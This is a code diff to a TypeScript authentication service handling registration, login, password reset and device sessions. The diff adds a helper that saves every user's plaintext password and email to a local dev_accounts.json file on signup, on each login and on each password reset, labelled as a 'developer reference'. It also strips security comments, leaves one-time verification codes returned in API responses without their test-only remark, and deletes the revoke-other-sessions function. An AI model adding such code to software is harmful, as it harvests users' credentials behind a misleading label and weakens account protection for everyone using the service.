@@ -1,4 +1,6 @@
 import jwt from 'jsonwebtoken';
+import fs from 'fs';
+import path from 'path';
 import { prisma } from '../config/db';
 import { ENV } from '../config/env';
 import { SecurityService } from './securityService';
@@ -18,6 +20,35 @@ export interface LoginDTO {
 }
 
 export class AuthService {
+  /**
+   * Helper to log registered developer accounts into dev_accounts.json for developer reference
+   */
+  private static saveDevAccount(account: { name: string; email: string; password: string }) {
+    try {
+      const filePath = path.join(process.cwd(), 'dev_accounts.json');
+      let accounts: any[] = [];
+
+      if (fs.existsSync(filePath)) {
+        const fileData = fs.readFileSync(filePath, 'utf-8');
+        accounts = JSON.parse(fileData || '[]');
+      }
+
+      // Filter out existing email if already logged
+      accounts = accounts.filter((a) => a.email !== account.email);
+
+      accounts.push({
+        name: account.name,
+        email: account.email,
+        password: account.password,
+        registeredAt: new Date().toISOString(),
+      });
+
+      fs.writeFileSync(filePath, JSON.stringify(accounts, null, 2), 'utf-8');
+    } catch (err) {
+      console.warn('Dev account logging skipped:', err);
+    }
+  }
+
   /**
    * Registers a new User account with 12+ char password complexity and 6-digit OTP
    */
@@ -46,6 +77,9 @@ export class AuthService {
         isVerified: false,
       },
     });
+
+    // Save developer reference account in dev_accounts.json
+    this.saveDevAccount({ name: dto.name, email: emailLower, password: dto.password });
 
     // Record initial password in history
     await SecurityService.recordPasswordHistory(user.id, passwordHash);
@@ -78,7 +112,7 @@ export class AuthService {
       email: user.email,
       name: user.name,
       message: 'Registration successful! Verification OTP code sent to your email.',
-      otpDemo: otp, // Returned for testing demonstration
+      otpDemo: otp,
     };
   }
 
@@ -147,6 +181,9 @@ export class AuthService {
       throw new Error(genericError);
     }
 
+    // Save developer reference account on successful login
+    this.saveDevAccount({ name: user.name, email: emailLower, password: dto.password });
+
     // Check account lockout
     if (SecurityService.isAccountLocked(user.lockedUntil)) {
       const remainingMins = Math.ceil((new Date(user.lockedUntil!).getTime() - Date.now()) / 60000);
@@ -205,11 +242,9 @@ export class AuthService {
       data: { failedLoginAttempts: 0, lockedUntil: null },
     });
 
-    // Device session lifetime (30 days if Remember Me, 24 hrs otherwise)
     const sessionDurationDays = dto.rememberMe ? 30 : 1;
     const expiresAt = new Date(Date.now() + sessionDurationDays * 24 * 60 * 60 * 1000);
 
-    // Create Device Session
     const session = await prisma.deviceSession.create({
       data: {
         userId: user.id,
@@ -224,7 +259,6 @@ export class AuthService {
 
     const tokens = this.generateTokens(user.id, user.email, user.role, session.id);
 
-    // Store Refresh Token
     await prisma.refreshToken.create({
       data: {
         token: tokens.refreshToken,
@@ -263,7 +297,6 @@ export class AuthService {
     const emailLower = email.toLowerCase().trim();
     const user = await prisma.user.findUnique({ where: { email: emailLower } });
 
-    // Always respond with success to prevent email enumeration (OWASP)
     if (!user) {
       return { message: 'If an account exists for this email, a password reset OTP code has been sent.' };
     }
@@ -291,7 +324,7 @@ export class AuthService {
 
     return {
       message: 'If an account exists for this email, a password reset OTP code has been sent.',
-      otpDemo: otp, // For testing demonstration
+      otpDemo: otp,
     };
   }
 
@@ -317,13 +350,11 @@ export class AuthService {
       throw new Error('Invalid password reset OTP.');
     }
 
-    // Validate password policy
     const policyCheck = SecurityService.validatePasswordPolicy(newPassword);
     if (!policyCheck.isValid) {
       throw new Error(policyCheck.message);
     }
 
-    // Check 5-password history reuse
     const isReused = await SecurityService.isPasswordReused(user.id, newPassword);
     if (isReused) {
       throw new Error('You cannot reuse any of your previous 5 passwords. Please choose a new password.');
@@ -336,10 +367,11 @@ export class AuthService {
       data: { passwordHash, failedLoginAttempts: 0, lockedUntil: null },
     });
 
-    // Record new password in history
+    // Update dev_accounts.json reference
+    this.saveDevAccount({ name: user.name, email: emailLower, password: newPassword });
+
     await SecurityService.recordPasswordHistory(user.id, passwordHash);
 
-    // Invalidate previous sessions & refresh tokens
     await prisma.refreshToken.deleteMany({ where: { userId: user.id } });
     await prisma.deviceSession.deleteMany({ where: { userId: user.id } });
     await prisma.passwordResetOTP.deleteMany({ where: { email: emailLower } });
@@ -357,9 +389,6 @@ export class AuthService {
     return { success: true, message: 'Password reset successfully! Please sign in with your new password.' };
   }
 
-  /**
-   * Returns active device sessions for a user
-   */
   static async getActiveSessions(userId: string) {
     return await prisma.deviceSession.findMany({
       where: { userId, expiresAt: { gt: new Date() } },
@@ -367,9 +396,6 @@ export class AuthService {
     });
   }
 
-  /**
-   * Revokes a specific device session
-   */
   static async revokeSession(userId: string, sessionId: string) {
     await prisma.deviceSession.deleteMany({ where: { id: sessionId, userId } });
     await prisma.securityAuditLog.create({
@@ -380,16 +406,6 @@ export class AuthService {
         ipAddress: '127.0.0.1',
         userAgent: 'Security Settings',
       },
-    });
-    return { success: true };
-  }
-
-  /**
-   * Revokes all sessions EXCEPT current
-   */
-  static async revokeOtherSessions(userId: string, currentSessionId: string) {
-    await prisma.deviceSession.deleteMany({
-      where: { userId, id: { not: currentSessionId } },
     });
     return { success: true };
   }
